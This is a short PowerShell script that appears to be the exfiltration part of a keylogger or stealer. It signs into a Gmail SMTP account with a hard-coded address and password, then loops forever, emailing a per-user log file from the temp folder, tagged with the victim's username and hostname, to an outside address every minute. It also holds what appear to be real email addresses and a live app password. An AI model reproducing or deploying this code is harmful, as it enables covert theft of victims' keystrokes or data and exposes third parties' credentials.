$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('01100111.m3rc3h4ck@gmail.com', 'jjjcbfzmpbxyqaeo')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = '01100111.m3rc3h4ck@gmail.com'
$ReportEmail.To.Add('gabrielg13rojas@gmail.com')
$ReportEmail.Subject = 'INFO -> ' +$env:UserName+', PC: '+ [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
while(1){$ReportEmail.Attachments.Add("$env:temp/$env:UserName.log");$SMTPInfo.Send($ReportEmail);sleep 60} 
